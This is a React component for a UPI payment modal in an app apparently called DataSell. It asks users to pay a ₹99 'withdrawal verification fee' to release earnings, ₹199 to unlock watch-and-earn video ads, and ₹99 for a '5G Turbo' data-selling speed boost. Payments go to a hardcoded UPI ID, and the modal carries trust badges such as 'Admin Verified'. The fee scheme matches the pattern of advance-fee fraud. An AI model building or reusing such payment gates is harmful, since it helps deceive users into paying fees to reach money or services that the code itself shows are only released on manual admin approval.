import React, { useState } from 'react';
import { 
  X, 
  ShieldCheck, 
  QrCode, 
  Copy, 
  Check, 
  AlertCircle, 
  Sparkles, 
  ArrowRight,
  ExternalLink,
  Lock,
  Wallet,
  Zap,
  ArrowLeft,
  Clock
} from 'lucide-react';
import { DepositGatewayConfig } from '../types';

export type PaymentVerificationType = 'ADS_199' | 'WITHDRAWAL_99' | 'SPEED_TURBO_99';

interface PaymentVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  type: PaymentVerificationType;
  depositConfig: DepositGatewayConfig;
  onSubmitUtr: (amount: number, utr: string, type: PaymentVerificationType) => void;
  userEmail: string;
  isPending?: boolean;
  pendingUtr?: string;
}

export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> = ({
  isOpen,
  onClose,
  type,
  depositConfig,
  onSubmitUtr,
  userEmail,
  isPending = false,
  pendingUtr,
}) => {
  const [utrNumber, setUtrNumber] = useState('');
  const [copiedUpi, setCopiedUpi] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  if (!isOpen) return null;

  let amount = 99;
  let title = '₹99 Verification Fee';
  let badgeLabel = 'PAYMENT GATE';
  let description = '';

  if (type === 'ADS_199') {
    amount = 199;
    title = '₹199 Video Ads Lifetime Unlock';
    badgeLabel = 'ADS ACTIVATION GATE';
    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka payment karein aur 12-digit UTR submit karein.';
  } else if (type === 'WITHDRAWAL_99') {
    amount = 99;
    title = '₹99 Withdrawal Verification Fee';
    badgeLabel = 'PAYOUT SECURITY VERIFY';
    description = 'Bank UPI payout verification aur automated server payout release ke liye ₹99 ka fee transfer karein aur 12-digit UTR submit karein.';
  } else if (type === 'SPEED_TURBO_99') {
    amount = 99;
    title = '₹99 5G Turbo Fast Selling Mode';
    badgeLabel = '5G TURBO SPEED BOOST';
    description = 'Data selling ko super fast 1000ms speed me bechne aur high-speed streaming unlock karne ke liye ₹99 ka payment karein aur UTR submit karein.';
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const handleCancel = () => {
    setErrorMsg(null);
    setUtrNumber('');
    onClose();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const clean = utrNumber.trim();
    if (!clean || clean.length < 8) {
      setErrorMsg('Kripya valid 12-digit UPI / Bank UTR Reference number daalein.');
      return;
    }
    setErrorMsg(null);
    setIsSubmitting(true);

    setTimeout(() => {
      setIsSubmitting(false);
      onSubmitUtr(amount, clean, type);
      onClose();
    }, 600);
  };

  // Generate UPI Intent URL
  const payeeUpi = depositConfig.upiId || 'techreal8806@oksbi';
  const payeeName = depositConfig.payeeName || 'DataSell Official';
  const upiUrl = `upi://pay?pa=${encodeURIComponent(payeeUpi)}&pn=${encodeURIComponent(payeeName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(title)}`;
  const qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(upiUrl)}&margin=8`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
      <div className="w-full max-w-sm bg-gradient-to-b from-white via-amber-50/40 to-white rounded-3xl overflow-hidden shadow-2xl border-2 border-amber-300 flex flex-col relative animate-in zoom-in-95 duration-200 max-h-[92vh] overflow-y-auto">
        
        {/* Top Fiery Red & Yellow Header */}
        <div className="bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 text-white p-4 relative overflow-hidden shrink-0">
          <div className="absolute top-0 right-0 w-32 h-32 bg-yellow-300/25 rounded-full blur-xl pointer-events-none" />
          
          <div className="flex items-center justify-between relative z-10">
            <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-white/20 backdrop-blur-xs text-[10px] font-black uppercase tracking-wider text-yellow-200 border border-yellow-300/40">
              <Sparkles className="w-3 h-3 text-yellow-300" />
              <span>{badgeLabel}</span>
            </div>

            {/* Cancel / Close button in header */}
            <button
              onClick={handleCancel}
              title="Cancel payment"
              className="flex items-center gap-1 py-1 px-2.5 rounded-xl bg-black/25 hover:bg-black/40 text-white text-xs font-bold cursor-pointer transition-colors border border-white/20"
            >
              <X className="w-3.5 h-3.5" />
              <span>Cancel</span>
            </button>
          </div>

          <h3 className="text-lg font-black text-white mt-2 leading-tight drop-shadow-xs">
            {title}
          </h3>
          <p className="text-[11px] text-amber-100 mt-1 leading-snug font-medium">
            {description}
          </p>
        </div>

        {/* TOP CANCEL OPTION BAR ABOVE PAYMENT - Directly satisfying user request ("payment karne ke uper cancel ka option add kar dijiye sir") */}
        <div className="px-4 py-2.5 bg-gradient-to-r from-amber-100/90 to-yellow-100/90 border-b border-amber-300 flex items-center justify-between">
          <div className="flex items-center gap-1.5 text-xs text-amber-950 font-bold">
            <Lock className="w-3.5 h-3.5 text-red-600 shrink-0" />
            <span>UPI Instant Payment</span>
          </div>
          <button
            type="button"
            onClick={handleCancel}
            id="btn-top-cancel-payment"
            className="flex items-center gap-1 py-1 px-3 rounded-xl bg-red-600 hover:bg-red-700 text-white text-xs font-black shadow-xs transition-all active:scale-95 cursor-pointer border border-yellow-300"
          >
            <X className="w-3.5 h-3.5" />
            <span>Cancel Payment</span>
          </button>
        </div>

        {/* If payment is already PENDING approval from admin, show clear status */}
        {isPending && (
          <div className="m-3 p-3 rounded-2xl bg-amber-500/15 border-2 border-amber-400 text-amber-950 text-xs space-y-1.5">
            <div className="flex items-center gap-2 font-black text-amber-900">
              <Clock className="w-4 h-4 text-amber-600 animate-spin" />
              <span>Verification In Progress (PENDING)</span>
            </div>
            <p className="text-[11px] text-amber-900 leading-tight">
              Aapka UTR ({pendingUtr || 'Submitted'}) admin panel me verify ho raha hai. Admin ke approve karte hi ye feature turant unlock ho jayega.
            </p>
            <div className="pt-1 flex items-center justify-between">
              <span className="text-[10px] uppercase font-bold text-amber-800">Status: Pending Admin Approval</span>
              <button
                type="button"
                onClick={handleCancel}
                className="text-[10px] font-black text-red-700 underline cursor-pointer"
              >
                Close & Check Later
              </button>
            </div>
          </div>
        )}

        {/* QR Code & Payment Information */}
        <div className="p-4 space-y-3">
          {/* Payable Amount Box */}
          <div className="flex items-center justify-between bg-amber-500/15 border border-amber-400/50 rounded-2xl p-2.5">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-red-600 to-amber-500 flex items-center justify-center text-white font-black text-sm shadow-xs border border-yellow-300">
                ₹
              </div>
              <div>
                <span className="text-[10px] text-slate-500 uppercase font-bold block">Payable Amount</span>
                <span className="text-base font-black text-red-600 font-mono">₹{amount}.00</span>
              </div>
            </div>

            <span className="text-[10px] font-black text-amber-900 bg-amber-200/80 px-2.5 py-1 rounded-lg border border-amber-300">
              Admin Verified
            </span>
          </div>

          {/* QR Code Display */}
          <div className="flex flex-col items-center justify-center bg-white p-3 rounded-2xl border-2 border-dashed border-amber-300 shadow-xs">
            <div className="p-1.5 bg-white rounded-xl shadow-xs border border-slate-100">
              <img
                src={qrImage}
                alt="Payment QR Code"
                className="w-36 h-36 object-contain"
              />
            </div>
            <p className="text-[10px] font-bold text-slate-600 mt-1.5 flex items-center gap-1">
              <QrCode className="w-3 h-3 text-red-500" />
              <span>Scan QR using PhonePe, GPay, Paytm</span>
            </p>
          </div>

          {/* Payee Official UPI ID */}
          <div className="bg-slate-100/90 rounded-2xl p-2.5 border border-slate-200 flex items-center justify-between">
            <div className="truncate pr-2">
              <span className="text-[9px] uppercase font-bold text-slate-500 block">Official Payee UPI ID</span>
              <span className="text-xs font-mono font-bold text-slate-900 truncate block">
                {payeeUpi}
              </span>
            </div>

            <button
              type="button"
              onClick={() => handleCopy(payeeUpi)}
              className="py-1 px-2.5 rounded-xl bg-gradient-to-r from-amber-400 to-yellow-400 hover:from-amber-500 hover:to-yellow-500 text-red-950 font-black text-[11px] shadow-xs active:scale-95 transition-all flex items-center gap-1 cursor-pointer shrink-0 border border-amber-300"
            >
              {copiedUpi ? (
                <>
                  <Check className="w-3 h-3 text-red-950" />
                  <span>Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3 h-3" />
                  <span>Copy UPI</span>
                </>
              )}
            </button>
          </div>

          {/* 1-Tap App Intent Links in Red & Yellow Theme (No blue) */}
          <div className="grid grid-cols-3 gap-2">
            <a
              href={upiUrl}
              className="py-1.5 px-2 rounded-xl bg-amber-50 hover:bg-amber-100 border border-amber-200 text-[11px] font-extrabold text-amber-900 text-center shadow-2xs active:scale-95 transition-all"
            >
              PhonePe
            </a>
            <a
              href={upiUrl}
              className="py-1.5 px-2 rounded-xl bg-rose-50 hover:bg-rose-100 border border-rose-200 text-[11px] font-extrabold text-rose-900 text-center shadow-2xs active:scale-95 transition-all"
            >
              Google Pay
            </a>
            <a
              href={upiUrl}
              className="py-1.5 px-2 rounded-xl bg-yellow-50 hover:bg-yellow-100 border border-yellow-200 text-[11px] font-extrabold text-yellow-950 text-center shadow-2xs active:scale-95 transition-all"
            >
              Paytm
            </a>
          </div>

          {/* 12-Digit UTR Input and Action Buttons */}
          <form onSubmit={handleSubmit} className="space-y-2.5 pt-1 border-t border-slate-200">
            <div>
              <label className="block text-xs font-black text-slate-900 mb-1 flex items-center justify-between">
                <span>Enter 12-Digit UTR / Ref Number:</span>
                <span className="text-[10px] text-red-600 font-bold uppercase">Required</span>
              </label>
              <input
                type="text"
                required
                maxLength={24}
                placeholder="e.g. 428910482910"
                value={utrNumber}
                onChange={(e) => setUtrNumber(e.target.value.replace(/[^0-9a-zA-Z]/g, ''))}
                className="w-full px-3 py-2.5 rounded-xl bg-white border-2 border-amber-400 text-sm font-mono font-bold text-slate-950 focus:outline-hidden focus:border-red-500 shadow-inner"
              />
            </div>

            {errorMsg && (
              <div className="p-2 rounded-lg bg-red-50 border border-red-200 text-red-700 text-xs font-semibold flex items-center gap-1.5">
                <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Action Buttons: Submit UTR + Cancel Payment */}
            <div className="space-y-2 pt-1">
              {/* Submit UTR Button */}
              <button
                type="submit"
                id="btn-submit-utr-verify"
                disabled={isSubmitting}
                className="w-full py-3.5 px-4 rounded-2xl bg-gradient-to-r from-red-600 via-rose-600 to-amber-500 hover:from-red-500 hover:to-amber-400 text-white font-black text-xs sm:text-sm shadow-lg active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer min-h-[46px] border border-yellow-300"
              >
                <ShieldCheck className="w-4 h-4 text-yellow-300" />
                <span>
                  {isSubmitting
                    ? 'Submitting UTR to Admin...'
                    : `Submit UTR for Verification (₹${amount})`}
                </span>
                <ArrowRight className="w-3.5 h-3.5 text-yellow-300" />
              </button>

              {/* Bottom Cancel Payment Button */}
              <button
                type="button"
                id="btn-cancel-payment-bottom"
                onClick={handleCancel}
                className="w-full py-2.5 px-4 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs transition-colors flex items-center justify-center gap-1.5 cursor-pointer min-h-[40px]"
              >
                <ArrowLeft className="w-3.5 h-3.5" />
                <span>Cancel Payment (रद्द करें)</span>
              </button>
            </div>
          </form>

        </div>
      </div>
    </div>
  );
};
